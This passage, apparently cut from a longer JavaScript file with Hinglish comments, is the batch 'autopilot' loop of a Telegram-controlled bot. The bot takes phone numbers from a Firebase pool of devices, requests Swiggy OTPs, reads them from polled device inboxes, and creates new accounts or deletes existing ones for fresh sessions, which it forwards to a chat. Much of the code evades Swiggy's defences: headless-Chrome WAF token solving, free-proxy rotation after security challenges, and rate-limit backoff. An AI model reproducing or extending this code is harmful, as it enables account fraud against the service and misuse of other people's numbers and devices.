// ===== 👑 AUTOPILOT ENGINE — ek START, apne aap poora batch =====
//
// Boss START dabata hai → engine pool se number uthata, processSingleNumber chalata,
// gap + backoff manage karta, STOP/time/target pe ruk jata hai — aur har stage ka
// status LIVE card par edit karta rehta hai. Boss60 minute baad aakar summary dekhta hai.
//
// Env knobs:
//   PREMIUM_BATCH_TARGET            — kitne fresh sessions (default 100)
//   PREMIUM_BATCH_MAX_MINUTES       — max run time (default 120)
//   PREMIUM_BATCH_GAP_MS            — do numbers ke beech gap (default 6000)
//   PREMIUM_RATE_LIMIT_BACKOFF_MS   — Swiggy rate-limit par ruk (default 15 min)
//   PREMIUM_ALLOW_OFFLINE_DEVICES   — '1' = offline devices bhi try karo
//   PREMIUM_OTP_WAIT_MS             — poll shuru karne se pehle wait (default 3000)
//   PREMIUM_OTP_TIMEOUT_MS          — inbox poll budget (default 90000)
//   PREMIUM_DEVICE_ACTIVE_WINDOW_MS — last-seen gate window (default 60000, 0=off)
//
// Engine process-singleton hai: dono bots (main + autopilot) isi state ko dekhte hain.

import { isFirebaseConfigured, firebaseSetupHintLines, listPoolNumbers, scanFreshDevices } from './firebase-numbers.js';
import { applyActiveSource } from './firebase-sources.js';
import { getSetting } from './bot-settings.js';
import { processSingleNumber, freshEntriesFrom, preferOnline, getPremiumLedger } from './number-pipeline.js';
import { getLiveSwiggyWafToken, setBridgeProxy, getBridgeProxy, getChromeStatus } from './swiggy-bridge.js';
import * as wafPool from './waf-pool.js';
import * as proxyPool from './proxy-pool.js';
import { esc, section, sub, field } from './rich-text.js';

const envInt = (key, dflt) => {
  const v = Number(process.env[key]);
  return Number.isFinite(v) && v >= 0 ? v : dflt;
};

// Bridge ke active proxy ka id (rotate karne ke liye)
const getBridgeProxyId = () => getBridgeProxy()?.id || '';

// ---------------------------------------------------------------------------
// State
// ---------------------------------------------------------------------------
let ui = null; // { update(text, keyboardRows) } — live card ke liye
const state = {
  running: false,
  stopRequested: false,
  stopReason: '',
  startedAt: 0,
  finishedAt: 0,
  target: 0,
  maxMinutes: 0,
  gapMs: 0,
  backoffMs: 0,
  processed: 0,
  fresh: 0,
  freshNew: 0,
  freshAfterDelete: 0,
  skipped: 0,
  deferred: 0,
  staleSkips: 0,          // last-seen window se bahar wale devices (OTP bheje baghair skip)
  failed: 0,
  aborted: 0,
  rateStrikes: 0,
  wafStrikes: 0,
  wafCooldowns: 0,
  serverErrors: 0,        // Swiggy/proxy temporary 5xx/network — number failed nahi gina jata
  transientStrikes: 0,    // lagatar temporary errors (cool-off ladder ke liye)
  proxyRotations: 0,
  routeMode: 'direct',    // 'proxy' | 'direct-fallback' | 'direct'
  proxyChallenges: 0,     // current proxy route system par lagatar WAF challenges
  directChallenges: 0,    // direct fallback par lagatar WAF challenges
  deferredQueue: 0,
  consecutiveFails: 0,
  current: null,          // { phone, startedAt }
  history: [],            // { phone, kind, reason? } (last 200)
  freshAccounts: [],      // { phone, accountKey } (successful sessions)
  lastError: '',
  poolTotal: 0,
  poolFresh: 0,
  scanning: false,        // abhi devices ki parallel last-seen scan chal rahi hai
  scanChecked: 0,         // backward-compat: is run ke TOTAL probes (unique devices nahi)
  scanTotalProbes: 0,     // repeated passes sameet saare Firebase probes
  scanUniqueChecked: 0,   // current pass me check hue unique devices
  scanTotalDevices: 0,    // current pass ke total unique candidate devices
  scanPass: 1,            // full-pool scan ka pass number
  scanWindowMs: 0,        // current/selected last-seen ladder window
  scanFresh: 0,           // hot-queue me ready (fresh) devices
};

export function getAutopilotSnapshot() {
  return {
    running: state.running,
    stopRequested: state.stopRequested,
    stopReason: state.stopReason,
    startedAt: state.startedAt,
    finishedAt: state.finishedAt,
    target: state.target,
    maxMinutes: state.maxMinutes,
    processed: state.processed,
    fresh: state.fresh,
    freshNew: state.freshNew,
    freshAfterDelete: state.freshAfterDelete,
    skipped: state.skipped,
    deferred: state.deferred,
    failed: state.failed,
    staleSkips: state.staleSkips || 0,
    aborted: state.aborted,
    rateStrikes: state.rateStrikes,
    wafStrikes: state.wafStrikes,
    wafCooldowns: state.wafCooldowns,
    serverErrors: state.serverErrors || 0,
    transientStrikes: state.transientStrikes || 0,
    proxyRotations: state.proxyRotations,
    routeMode: state.routeMode || 'direct',
    proxyChallenges: state.proxyChallenges || 0,
    directChallenges: state.directChallenges || 0,
    deferredQueue: state.deferredQueue,
    currentProxy: getBridgeProxy()?.label || '',
    current: state.current ? { ...state.current } : null,
    poolTotal: state.poolTotal,
    poolFresh: state.poolFresh,
    scanning: Boolean(state.scanning),
    scanChecked: state.scanChecked || 0,
    scanTotalProbes: state.scanTotalProbes || state.scanChecked || 0,
    scanUniqueChecked: state.scanUniqueChecked || 0,
    scanTotalDevices: state.scanTotalDevices || 0,
    scanPass: state.scanPass || 1,
    scanWindowMs: state.scanWindowMs || 0,
    scanFresh: state.scanFresh || 0,
    lastError: state.lastError,
    history: state.history.slice(-40),
    freshAccounts: state.freshAccounts.slice(-100),
    elapsedMs: state.startedAt ? ((state.finishedAt || Date.now()) - state.startedAt) : 0,
    endReason: state.stopReason,
  };
}

export function isAutopilotRunning() {
  return state.running;
}

export function requestAutopilotStop(reason = 'manual') {
  if (!state.running) return false;
  state.stopRequested = true;
  state.stopReason = reason;
  return true;
}

// Security challenge ke baad IP ko kitna thanda hone dein — ladder 30s →
// 60s → 120s → 240s (lagatar strikes par). waf-pool ka circuit-breaker
// cooldown usse lamba ho to wahi jeet (warna agla number seedha pool
// cooldown khayega), lekin 5 min se zyada ek saath nahi (batch zinda rahe).
export function wafChallengeWaitMs(consecutiveStrikes, poolCooldownMs = 0) {
  const ladder = [30_000, 60_000, 120_000, 240_000];
  const idx = Math.min(Math.max(1, Number(consecutiveStrikes) || 1), ladder.length) - 1;
  const poolPart = Math.min(Math.max(0, Number(poolCooldownMs) || 0), 5 * 60_000);
  return Math.min(Math.max(ladder[idx], poolPart), 5 * 60_000);
}

// Swiggy/proxy temporary 5xx ya network error par cool-off ladder. Proxy
// rotate ho jaye to pehle 2 strikes par wait nahi (nayi IP turant try hogi);
// ye wait sirf direct/no-next-proxy ya 3+ lagatar transient errors par
// istemal hota hai taaki asal Swiggy outage me poora pool churn na ho.
export function transientSwiggyRetryWaitMs(consecutiveStrikes) {
  const ladder = [20_000, 45_000, 60_000, 60_000];
  const idx = Math.min(Math.max(1, Number(consecutiveStrikes) || 1), ladder.length) - 1;
  return ladder[idx];
}

// Security challenge ke baad route ka faisla. Free proxies teeno garam hon
// to unhi ke beech ghumna dead-end hai — Render ki direct IP ko asal chance
// do. Direct bhi 2 baar challenge de to best proxy route par wapas jao.
export function securityRouteAction({
  proxyEnabled = false,
  usingDirectFallback = false,
  proxyChallenges = 0,
  directChallenges = 0,
} = {}) {
  if (usingDirectFallback) {
    return Number(directChallenges) >= 2 ? 'restore_proxy' : 'direct_cooldown';
  }
  if (!proxyEnabled) return 'direct_cooldown';
  return Number(proxyChallenges) >= 3 ? 'direct_fallback' : 'rotate_proxy';
}

// Fresh session bante HI uska JSON chat me bhejo (batch ke end ka wait nahi).
// ui.sendSession fresh-bot deta hai (document file ke tor par bhejta hai).
// Fire-and-forget: send fail ho bhi jaye to batch kabhi na ruke.
export function notifyFreshSession(currentUi, payload) {
  try {
    if (currentUi && typeof currentUi.sendSession === 'function') {
      Promise.resolve(currentUi.sendSession(payload))
        .catch((e) => console.warn('[Autopilot] session send:', e?.message));
      return true;
    }
  } catch (e) {
    console.warn('[Autopilot] session send:', e?.message);
  }
  return false;
}

// ---------------------------------------------------------------------------
// Cards
// ---------------------------------------------------------------------------
const kb = (rows) => rows;

function fmtDuration(ms) {
  const s = Math.max(0, Math.floor(ms / 1000));
  const h = Math.floor(s / 3600);
  const m = Math.floor((s % 3600) / 60);
  const sec = s % 60;
  if (h) return `${h}h ${m}m`;
  if (m) return `${m}m ${sec}s`;
  return `${sec}s`;
}

function statsLines() {
  const pSummary = (() => { try { return proxyPool.proxySummary(); } catch { return null; } })();
  return [
    field('Processed', String(state.processed)),
    field('✅ Fresh sessions', `${state.fresh}  (naye: ${state.freshNew} · delete+fresh: ${state.freshAfterDelete})`),
    field('⚠️ Skipped', `${state.skipped} · deferred: ${state.deferred} · 📴 stale devices: ${state.staleSkips || 0}`),
    field('× Failed', `${state.failed} · aborted: ${state.aborted} · rate-limit: ${state.rateStrikes}`),
    (state.wafCooldowns || state.wafStrikes || state.proxyRotations)
      ? field('🛡 WAF', `${state.wafCooldowns} cooldown · challenges: ${state.wafStrikes} · rotations: ${state.proxyRotations} · token-ready: ${pSummary?.tokenReadyCount || 0}`)
      : '',
    state.serverErrors
      ? field('↻ Swiggy 5xx', `${state.serverErrors} temporary · numbers failed nahi, retry queue me`)
      : '',
    pSummary?.enabled
      ? field('🔀 Proxy', state.routeMode === 'direct-fallback'
          ? `DIRECT fallback (Render IP)  ·  pool ${pSummary.enabledCount} ON  ·  rotates: ${state.proxyRotations}`
          : `${getBridgeProxy()?.label || '—'}  ·  ${pSummary.enabledCount} ON  ·  rotates: ${state.proxyRotations}`)
      : field('🔀 Proxy', 'OFF (ek hi IP — ⚙️ Settings me add karo)'),
    field('Pool', state.poolTotal
      ? `${state.poolFresh} fresh / ${state.poolTotal} numbers`
      : 'load ho raha hai…'),
    (state.scanning || state.scanChecked)
      ? field('🔎 Device scan', `pass ${state.scanPass || 1}: ${state.scanUniqueChecked || 0}/${state.scanTotalDevices || 0} unique check · total probes ${state.scanTotalProbes || state.scanChecked || 0} · window ≤${fmtDuration(state.scanWindowMs || 0)} · ${state.scanFresh || 0} fresh ready${state.scanning ? ' · scanning…' : ''}`)
      : '',
    state.current
      ? `📍 <b>Abhi:</b> <code>${esc(state.current.phone)}</code> (${fmtDuration(Date.now() - state.current.startedAt)})`
      : sub(state.scanning ? 'Zinda devices dhoondh raha hoon (parallel scan)…' : 'Agla number select ho raha hai…'),
  ];
}

function idleCard() {
  const running = state.running;
  const last = state.finishedAt ? state : null;
  const body = running
    ? [
        `● <b>RUNNING</b> — ${fmtDuration(Date.now() - state.startedAt)} hue`,
        ...statsLines(),
      ]
    : [
        `› <b>READY.</b> Ek tap = autopilot ON.`,
        ``,
        `1️⃣ Pehle <b>zinda devices</b> parallel scan (last-seen fresh pehle)`,
        `2️⃣ Swiggy OTP → <b>live inbox poll</b> → OTP khud padh kar paste`,
        `3️⃣ 🆕 naya = register · ♻️ purana = delete → fresh login`,
        `4️⃣ charges/order/wallet block = <b>skip</b> · rate-limit = <b>backoff</b>`,
        ``,
        field('Target', `${state.target || envInt('PREMIUM_BATCH_TARGET', 100)} fresh sessions`),
        field('Max time', `${state.maxMinutes || envInt('PREMIUM_BATCH_MAX_MINUTES', 120)} minutes`),
        last && last.stopReason
          ? field('Last run', `${state.fresh} fresh · ${fmtDuration(state.finishedAt - state.startedAt)} · ${state.stopReason}`)
          : '',
      ].filter(Boolean);
  return section('👑 Premium Autopilot', body.join('\n'));
}

function progressCard(stageText) {
  return [
    `● <b>AUTOPILOT RUNNING</b> — ${fmtDuration(Date.now() - state.startedAt)} hue · target ${state.target}`,
    ``,
    stageText,
    ``,
    ...statsLines(),
  ].join('\n');
}

function summaryCard() {
  const freshList = state.freshAccounts.slice(-12)
    .map((a) => `• <code>${esc(a.phone)}</code> → <b>${esc(a.accountKey)}</b>`)
    .join('\n');
  const reasonText = {
    target: '🎯 Target pura ho gaya!',
    time: '⏱ Max time ho gaya.',
    'pool-exhausted': '🕳 Pool ke saare fresh numbers process ho gaye.',
    manual: '⏹ Aapne STOP dabaya.',
    stopped: '⏹ Stop kiya gaya.',
    rate_limited: '🚦 Swiggy ne rate limit laga di — thodi der baad dobara start karein.',
    security_challenge: '🛡 12 lagatar security challenges — ye IP abhi Swiggy ke liye pakki flagged hai. Kuch der baad, ya proxies ke saath, dobara start karein.',
    waf_stuck: '🛡 Bahut der tak WAF cooldown raha — proxies add karke dobara start karein (nayi IP par wait khatam ho jati hai).',
    circuit_breaker: '🔌 Bahut lagatar failures (proxy rotation ke baavjood) — reason dekh kar dobara start karein.',
    'no-online-devices': '📵 Pool me koi online device nahi mila — thodi der baad try karein.',
    firebase: '🔥 Firebase error — config/rules check karein.',
  }[state.stopReason] || `Band: ${state.stopReason}`;

  return section('📊 Autopilot — Final Summary', [
    reasonText,
    ``,
    ...statsLines(),
    ``,
    field('Runtime', fmtDuration((state.finishedAt || Date.now()) - state.startedAt)),
    state.lastError ? field('Last error', state.lastError) : '',
    freshList ? `` : '',
    freshList ? `▤ <b>Latest fresh sessions:</b>` : '',
    freshList || sub('Is run me koi fresh session nahi bana.'),
    ``,
    sub('Har fresh session ka JSON chat me file ki surat me bhej diya gaya hai (bot DB + cloud vault me bhi saved hai).'),
  ].filter((x) => x !== '' && x !== false).join('\n'));
}

function stopRows() {
  return [
    [{ text: '⏹ STOP BATCH', callback_data: 'prem_batch_stop', style: 'danger' }],
    [{ text: '📊 Status', callback_data: 'prem_batch_status' }, { text: '⌂ Main Menu', callback_data: 'boss_panel_home' }],
  ];
}

function doneRows() {
  return [
    [{ text: '▶️ START BATCH (Auto)', callback_data: 'prem_batch_start', style: 'success' }],
    [{ text: '📱 Get Number (one)', callback_data: 'prem_get_number' }],
    [{ text: '⌂ Main Menu', callback_data: 'boss_panel_home' }],
  ];
}

async function push(text, rows) {
  if (!ui || typeof ui.update !== 'function') return;
  try { await ui.update(text, kb(rows)); } catch (e) { console.warn('[Autopilot] ui:', e?.message); }
}

// Interruptible sleep (STOP dabate hi ruk jaye)
function sleep(ms, check) {
  return new Promise((resolve) => {
    const end = Date.now() + ms;
    const tick = () => {
      if ((check && check()) || Date.now() >= end) return resolve();
      setTimeout(tick, Math.min(1000, Math.max(50, end - Date.now())));
    };
    tick();
  });
}

// ---------------------------------------------------------------------------
// Main loop
// ---------------------------------------------------------------------------
export async function startAutopilot(opts = {}) {
  if (state.running) return { ok: false, reason: 'already-running' };

  // Settings: user ki bot UI wali values (db.json) > env > default — taaki
  // user ko .env chhedni hi na pade.
  const s = (key, fallback) => {
    try { const v = getSetting(key); return v === undefined ? fallback : v; } catch { return fallback; }
  };
  const target = Number(opts.target || s('target', envInt('PREMIUM_BATCH_TARGET', 100)));
  const maxMinutes = Number(opts.maxMinutes || s('maxMinutes', envInt('PREMIUM_BATCH_MAX_MINUTES', 120)));
  const gapMs = Number.isFinite(Number(opts.gapMs)) && Number(opts.gapMs) >= 0
    ? Number(opts.gapMs)
    : s('gapMs', envInt('PREMIUM_BATCH_GAP_MS', 6_000));
  const backoffMs = s('backoffMs', envInt('PREMIUM_RATE_LIMIT_BACKOFF_MS', 15 * 60_000));
  const allowOffline = s('allowOffline', String(process.env.PREMIUM_ALLOW_OFFLINE_DEVICES || '') === '1') === true;
  const otpCfg = {
    waitMs: s('otpWaitMs', envInt('PREMIUM_OTP_WAIT_MS', 3_000)),
    timeoutMs: s('otpTimeoutMs', envInt('PREMIUM_OTP_TIMEOUT_MS', 90_000)),
    pollMs: 1_500,
    acceptAnyAfterMs: 15_000,
    // Device last-seen gate: sirf wahi devices jinki last activity itni
    // taazi hai. Default 60s; sakht 10s ke liye Render env me
    // PREMIUM_DEVICE_ACTIVE_WINDOW_MS=10000 (aur 0 = gate off).
    activeWindowMs: envInt('PREMIUM_DEVICE_ACTIVE_WINDOW_MS', 60_000),
  };

  ui = opts.ui && typeof opts.ui.update === 'function' ? opts.ui : ui;

  // Reset state (snapshot purana summary ke liye reh sakta hai — naya run naya object)
  Object.assign(state, {
    running: true, stopRequested: false, stopReason: '',
    startedAt: Date.now(), finishedAt: 0,
    target, maxMinutes, gapMs, backoffMs,
    processed: 0, fresh: 0, freshNew: 0, freshAfterDelete: 0,
    skipped: 0, deferred: 0, staleSkips: 0, failed: 0, aborted: 0,
    rateStrikes: 0, wafStrikes: 0, wafCooldowns: 0, serverErrors: 0, transientStrikes: 0,
    consecutiveFails: 0, proxyRotations: 0,
    routeMode: 'direct', proxyChallenges: 0, directChallenges: 0,
    current: null, history: [], freshAccounts: [], lastError: '',
    poolTotal: 0, poolFresh: 0,
    scanning: false, scanChecked: 0, scanTotalProbes: 0,
    scanUniqueChecked: 0, scanTotalDevices: 0, scanPass: 1,
    scanWindowMs: Number(otpCfg.activeWindowMs) || 0, scanFresh: 0,
  });

  const userId = opts.userId || 'autopilot';
  let endReason = 'target';

  const tally = (res) => {
    // WAF cooldown = number bilkul untouched (sirf wait hui) — count me mat lo,
    // warna summary jhootha dikhega.
    if (res.kind === 'waf_cooldown') return 'waf_cooldown';

    // Device stale (last-seen window se bahar) — OTP gaya hi nahi, isliye
    // na processed, na fail. Sirf counter (card par dikhe kitne mare hue
    // devices chhaante gaye).
    if (res.kind === 'deferred_device_stale') {
      state.staleSkips = (state.staleSkips || 0) + 1;
      return 'device_stale';
    }

    // Security challenge — request WAF par hi ruk gayi, number bilkul
    // untouched hai (na OTP gaya, na kuch burn hua). Processed/fail me
    // gina jata tha to stats jhoothe padte the; engine isko alag handle
    // karta hai (number defer + IP cooldown + naya token).
    if (res.kind === 'security_challenge') return 'security_challenge';

    // Swiggy/proxy temporary 5xx ya network error — OTP confirm hi nahi
    // hua, isliye number processed/failed NAHI gina jayega. Engine use
    // retry queue me rakh kar proxy rotate karega. (Pehle ye
    // `failed_otp_send` ban kar number ko kha jata tha.)
    if (res.kind === 'deferred_swiggy_transient') {
      state.serverErrors = (state.serverErrors || 0) + 1;
      state.transientStrikes = (state.transientStrikes || 0) + 1;
      state.lastError = `${res.code || 'SWIGGY_TRANSIENT'}: ${res.reason || ''}`.slice(0, 160);
      return 'swiggy_transient';
    }

    state.processed++;
    // Koi bhi asal processed outcome matlab Swiggy side se jawab aaya —
    // temporary-error streak khatam.
    state.transientStrikes = 0;
    // Yahan pahuncha matlab request WAF ko paar karke Swiggy tak gayi
    // (OTP miss/fail bhi) — challenge "storm" khatam, strikes reset.
    state.wafStrikes = 0;
    state.proxyChallenges = 0;
    state.directChallenges = 0;
    state.history.push({ phone: res.phone, kind: res.kind, reason: res.reason || '', at: new Date().toISOString() });
    if (state.history.length > 200) state.history.splice(0, state.history.length - 200);

    if (res.ok) {
      state.fresh++;
      if (res.kind === 'fresh_new') state.freshNew++;
      if (res.kind === 'fresh_after_delete') state.freshAfterDelete++;
      state.freshAccounts.push({ phone: res.phone, accountKey: res.accountKey });
      // 📤 Fresh JSON isi waqt chat me bhej do — boss ko batch khatam
      // hone tak ruk kar list se nahi dhoondhna padega.
      notifyFreshSession(ui, {
        phone: res.phone, accountKey: res.accountKey, kind: res.kind, account: res.account,
      });
      state.consecutiveFails = 0;
      return 'ok';
    }
    switch (res.kind) {
      case 'skipped_delete_blocked': state.skipped++; state.consecutiveFails = 0; return 'skipped';
      case 'deferred_delete_otp_miss': state.deferred++; state.consecutiveFails = 0; return 'deferred';
      case 'aborted': state.aborted++; return 'aborted';
      case 'rate_limited': state.rateStrikes++; return 'rate_limited';
      default:
        state.failed++;
        state.consecutiveFails++;
        state.lastError = `${res.kind}: ${res.reason || res.swiggyText || ''}`.slice(0, 160);
        return 'failed';
    }
  };

  try {
    // Dynamic Firebase — user ne bot UI me jo active source chuna hai wahi use
    applyActiveSource();

    if (!isFirebaseConfigured()) {
      endReason = 'firebase';
      await push(section('⚙️ Firebase Setup Pending', firebaseSetupHintLines().join('\n')), [
        [{ text: '🏠 Menu', callback_data: 'ap_home', style: 'primary' }],
      ]);
      return { ok: false, reason: 'no-firebase-config' };
    }

    // WAF warm-up — pehle number se PEHLE ek valid aws-waf-token arrange karo
    // (Chromium solver, ~5-15s ek baar). Uske baad 2h tak saari OTP requests
    // token ke saath jaati hain → "aaye hi na" wali 403 challenges kam.
    // `let` isliye: free-proxy auto-fetch ke baad summary badal jati hai
    // (pool OFF → ON) aur poora loop isi snapshot par faisle karta hai.
    let ps = proxyPool.proxySummary();
    await push(section('🔥 Warm-up', [
      ps.enabledCount
        ? `🔀 Proxy pool: ${ps.enabledCount}/${ps.total} proxies ON — ${ps.rotation}`
        : `🔀 Koi proxy nahi — 🌐 <b>free proxies auto-fetch</b> try kar raha hoon (Swiggy par test karke sirf zinda wali rakhunga)…`,
      'Swiggy WAF token arrange kar raha hoon (ek baar, ~15s)…',
      '📋 Saath hi pool load + zinda devices ki parallel scan chal rahi hai…',
      sub('Sab ready hote hi pehla OTP fresh device par jayega.'),
    ].join('\n')), stopRows());

    // Proxy assign — pehli enabled proxy (round-robin se). WAF token bhi
    // usi IP ke liye arrange hoga.
    const rotateProxy = (excludeId = '', { countRotation = false } = {}) => {
      if (!proxyPool.isEnabled()) return null;
      const beforeId = getBridgeProxy()?.id || '';
      const next = proxyPool.pickProxy(excludeId ? { excludeIds: [excludeId] } : {});
      if (next) {
        setBridgeProxy(next);
        state.routeMode = 'proxy';
        // Counter yahin central hai — pehle security/rate branches asal
        // rotation ke bawjood card par 0 dikhaate the.
        if (countRotation && beforeId && next.id !== beforeId) {
          state.proxyRotations = (state.proxyRotations || 0) + 1;
        }
        console.log(`[Autopilot] Proxy → ${next.label}`);
        return next;
      }
      return null;
    };
    // 🌐 Free proxies — enabled proxy ek bhi nahi to list se khud le aao
    // (parallel me; WAF warm-up iske baad hi proxy choose karega kyunki
    // aws-waf-token IP-bound hota hai). Fail ho to direct mode — purana
    // behavior, koi rukawat nahi.
    const freePromise = (async () => {
      try {
        const r = await proxyPool.ensureFreeProxies({ min: 3, want: 10 });
        if (r && !r.skipped) {
          console.log(r.added
            ? `[Autopilot] 🌐 Free proxies: ${r.candidates || 0} candidates me se ${r.checked} parkhin, ${r.added} rakhin (clean ${r.clean || 0}, WAF-ready ${r.challenged || 0}) — IP rotation ON.`
            : `[Autopilot] 🌐 Free proxies: ${r.candidates || 0} candidates me se ${r.checked} parkhin, koi Swiggy-reachable nahi mili — direct mode chalega.`);
        }
        return r;
      } catch { return null; }
    })();

    // Pool load (bada node — ek baar, zarurat par refresh). YE WAF warm-up ke
    // SAATH parallel chalega — pehle dono ek-ke-peeche-ek the isliye pehla
    // number 30-60s baad ja kar start hota tha.
    let pool = [];
    let poolLoadedAt = 0;
    const loadPool = async () => {
      pool = await listPoolNumbers();
      poolLoadedAt = Date.now();
      state.poolTotal = pool.length;
      state.poolFresh = freshEntriesFrom(pool).length;
      return pool;
    };
    const poolPromise = loadPool().catch((e) => {
      state.lastError = e?.message || 'pool load fail';
      return pool;
    });

    // WAF warm-up BACKGROUND me — pool load + device scan iska wait nahi
    // karte. Pehla OTP bhejane se pehle ensureWarm() ise await karega.
    let wafTok = '';
    const warmPromise = (async () => {
      try {
        // PEHLE proxy final karo (free auto-fetch khatam hone do), PHIR token
        // solve karo — aws-waf-token IP-bound hai, galat IP ka token bekar hai.
        await freePromise;
        ps = proxyPool.proxySummary();
        if (ps.enabled) {
          const chosen = rotateProxy();
          if (!chosen) {
            // Saari proxies cooling/unsolvable hain — purani run ki stale
            // proxy chipki na reh jaye, seedha Render IP se shuru karo.
            setBridgeProxy(null);
            state.routeMode = 'direct-fallback';
          }
        } else {
          state.routeMode = 'direct';
        }
        wafPool.loadFromDb?.();
        wafTok = await getLiveSwiggyWafToken(false, { solveBudgetMs: 25_000 });
        console.log(wafTok ? '[Autopilot] WAF token ready (warm start).' : '[Autopilot] WAF token nahi mila (Chromium?) — raw mode me chalega.');
      } catch (e) {
        console.warn('[Autopilot] WAF warm-up skipped:', e?.message);
      }
      return wafTok;
    })();
    let warmAwaited = false;
    const ensureWarm = async () => {
      if (warmAwaited) return;
      warmAwaited = true;
      const tok = await warmPromise;
      // Chrome hi nahi mila aur saved token bhi nahi → har OTP par 403 pakki
      // hai. Pehle ye sirf console me chup chaap reh jata tha aur user ko
      // lagta tha "bot work nahi kar raha" — ab Telegram card par saaf btao.
      if (!tok) {
        let chrome = null;
        try { chrome = getChromeStatus(); } catch {}
        if (chrome && !chrome.found) {
          await push(section('⚠️ Chrome Nahi Mila — WAF Token Nahi Banega', [
            '› Is machine par <b>Chrome/Chromium nahi mila</b>, isliye Swiggy ka',
            '› WAF token arrange nahi ho payega — OTP requests par <b>403</b> aayegi.',
            '',
            '› <b>Fix:</b> Google Chrome install karo, <i>ya</i> <code>.env</code> me daalo:',
            '<code>PUPPETEER_EXECUTABLE_PATH=&lt;chrome.exe ka full path&gt;</code>',
            '',
            sub('Batch phir bhi try karega (raw mode) — lekin Chrome lagana hi sahi tod hai. /diag se status check karo.'),
          ].join('\n')), stopRows());
        }
      }
    };

    // 🔁 Retry-later queue — rate-limit/WAF se atke numbers yahan jate hain
    // aur batch ke aage ISSI run me dobara try hote hain (batch na rukne ke liye).
    const retryLater = []; // { entry, attempts, why }
    const deferNumber = (entry, why) => {
      if (!entry?.phone) return;
      if (retryLater.some((r) => r.entry.phone === entry.phone)) return;
      retryLater.push({ entry, attempts: 0, why });
      console.log(`[Autopilot] Deferred (${why}): ${entry.phone} — will retry in this run.`);
    };

    await poolPromise; // pool ready — warm-up abhi bhi background me ho sakta hai
    if (!pool.length && state.lastError) throw new Error(state.lastError); // Firebase error ko fatal hi rakho (pehle wala behavior)

    // RUNNING card ab pool ke ASAL numbers ke saath (pehle 0/0 dikhta tha)
    await push(idleCard(), stopRows());

    const refreshIfStale = async () => {
      if (Date.now() - poolLoadedAt > 10 * 60_000) {
        try { await loadPool(); } catch (e) { state.lastError = e?.message || 'pool refresh fail'; }
      }
    };

    // Generic fail (OTP miss / verify fail / exception) par number ledger me
    // mark NAHI hota — pehle wo isi run me baar-baar random pick hokar
    // dobara OTP burn karta rehta tha (aur Swiggy per-number limit lag jati
    // thi). Ab: ek run me ek number par max 2 generic-fail attempts.
    // (Rate-limit/WAF/security wale infra outcomes is cap se bahar hain —
    // unke liye defer/rotate wala alag flow hai.)
    const failedAttemptsThisRun = new Map(); // phone → count
    const underFailCap = (e) => (failedAttemptsThisRun.get(e.phone) || 0) < 2;
    // Temporary 5xx/network par bhi per-number cap — ek hi number par
    // OTP request baar-baar thok kar per-number limit nahi jalani.
    const transientAttemptsThisRun = new Map(); // phone → count
    const underTransientCap = (e) => (transientAttemptsThisRun.get(e.phone) || 0) < 2;
    // Isi run me jo devices last-seen gate par stale nikle — dobara-dobara
    // unhi ko probe na karo. "Fresh device ka wait" round me clear hota hai
    // (device beech me zinda ho sakta hai).
    const staleThisRun = new Set(); // phone
    let freshWaitRounds = 0;
    const pickFreshList = () => {
      let list = preferOnline(freshEntriesFrom(pool))
        .filter(underFailCap)
        .filter(underTransientCap)
        .filter((e) => !staleThisRun.has(e.phone));
      if (!allowOffline) {
        const onlineOnly = list.filter((e) => e.online !== false);
        if (onlineOnly.length) list = onlineOnly;
      }
      return list;
    };

    // ---- 🔎 Hot queue: parallel last-seen scan se ready fresh devices ----
    // Pehle gate ek-ek number ko sequential probe karta tha — 3000-device
    // pool me pehla zinda device milne me minutes lag jate the aur card par
    // kuch dikhta bhi nahi tha (bot phasa lagta tha). Ab scan 24-parallel
    // chunks me hota hai, fresh devices queue me ready rehte hain, aur card
    // par live "X devices check, Y fresh" dikhta hai.
    const gateOn = Number(otpCfg.activeWindowMs) > 0;
    const hotQueue = [];            // { entry, lastActivityMs, windowMs, checkedAt }
    const probedDevices = new Set(); // is pass me probe ho chuke deviceIds
    const takeFromHotQueue = () => {
      while (hotQueue.length) {
        const h = hotQueue.shift();
        state.scanFresh = hotQueue.length;
        if (staleThisRun.has(h.entry.phone) || !underFailCap(h.entry) || !underTransientCap(h.entry)) continue;
        if (getPremiumLedger()[h.entry.phone]) continue;
        return h;
      }
      return null;
    };
    const refillHotQueue = async () => {
      if (!gateOn) return { fresh: [] };
      const allCandidates = pickFreshList().filter((e) => e.deviceId);
      const passDeviceIds = new Set(allCandidates.map((e) => e.deviceId));
      const candidates = allCandidates.filter((e) => !probedDevices.has(e.deviceId));
      const baseUniqueChecked = [...probedDevices].filter((id) => passDeviceIds.has(id)).length;
      const baseTotalProbes = state.scanTotalProbes || state.scanChecked || 0;
      state.scanning = true;
      state.scanTotalDevices = passDeviceIds.size;
      state.scanUniqueChecked = baseUniqueChecked;
      state.scanWindowMs = Number(otpCfg.activeWindowMs) || 0;
      let lastPushAt = 0;
      try {
        const r = await scanFreshDevices(candidates, {
          windowMs: otpCfg.activeWindowMs,
          // User ki nayi ladder policy: base window (mis. 10s) me pool ke
          // is pass me koi na mile to Firebase ko dobara scan NAHI karna.
          // Scanner isi pass ke cached activity timestamps se window ko
          // 20s → 40s → 80s → 160s... double karke sabse taaza device dega,
          // jab tak woh kisi ladder window ke andar na aa jaye.
          maxWidenMs: Number.POSITIVE_INFINITY,
          widenByDoubling: true,
          // 10s jaise chhote window me 3 fresh jama karne ka wait pehle
          // wale ko hi stale bana deta tha. Isliye pehla zinda device milte
          // hi turant process karo; bade window par 3 ka chhota buffer rakho.
          want: Number(otpCfg.activeWindowMs) <= 15_000 ? 1 : 3,
          // Is pass ke saare unprobed candidates cover karo — warna pehle
          // 800 ke cached results par hi ladder lagana adhura hoga.
          chunkSize: 40, maxProbe: Math.max(800, candidates.length), concurrency: 24,
          shouldAbort: () => state.stopRequested,
          onProgress: ({ checked, freshCount }) => {
            state.scanUniqueChecked = Math.min(
              passDeviceIds.size,
              baseUniqueChecked + checked
            );
            state.scanTotalProbes = baseTotalProbes + checked;
            state.scanChecked = state.scanTotalProbes;
            state.scanFresh = hotQueue.length + freshCount;
            const now = Date.now();
            if (now - lastPushAt >= 4000) {
              lastPushAt = now;
              void push(progressCard(section('🔎 Zinda Devices Dhoondh Raha Hoon', [
                `› Pass ${state.scanPass || 1}: <b>${state.scanUniqueChecked}/${state.scanTotalDevices}</b> unique devices check hue — <b>${freshCount}</b> fresh mile (base window ≤${fmtDuration(otpCfg.activeWindowMs)}).`,
